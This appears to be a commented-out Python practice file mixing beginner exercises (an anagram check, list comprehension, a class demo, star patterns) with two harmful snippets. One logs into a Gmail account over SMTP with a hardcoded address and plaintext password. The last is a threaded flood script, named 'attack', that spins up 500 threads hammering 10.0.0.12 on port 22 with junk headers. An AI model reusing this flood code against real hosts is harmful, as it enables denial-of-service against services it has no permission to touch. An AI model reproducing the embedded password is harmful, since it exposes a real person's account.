# from collections import Counter
# a = 'ar10'
# b = '01ra'
# print('anagram') if Counter(a) == Counter(b) else print('not an anagram')

# import smtplib
# server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
# server.login("aaswin23regmi@gmail.com", "A@$hw!n@10#")
# server.sendmail ("aaswin23regmi@gmail.com",
#                 "aashwinregmi@gmail.com",
#                 "lets check if it works")
# server.quit

# a = ['ar','10','as','ash']
# b = [a for a in a if a.startswith('as')]
# print(b)

# class Example:
#     name = 'AR'
#     num = 10
#     def display(Self):
#         print(f'Name: {Self.name}')
#         print(f'Num: {Self.num}')
# a = Example()
# a.display()
# try:
#     del a.num
# except Exception as e:
#     print('error: ', e)

# for i in range(5):
#     for j in range(0, i):
#     	print("*",end=" ")
#     print()
# for i in range(4):
#     for j in range(i+1):
#     	print("* ",end="")
#     print()

# import threading
# import socket

# target = '10.0.0.12'
# port = 22
# fake_ip = '192.190.1.101'

# already_connected = 0

# def attack():
#     while True:
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.connect((target, port))
#         s.sendto(("GET: " + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
#         s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
#         s.close()

# for i in range(500):
#     thread = threading.Thread(target=attack)
#     thread.start()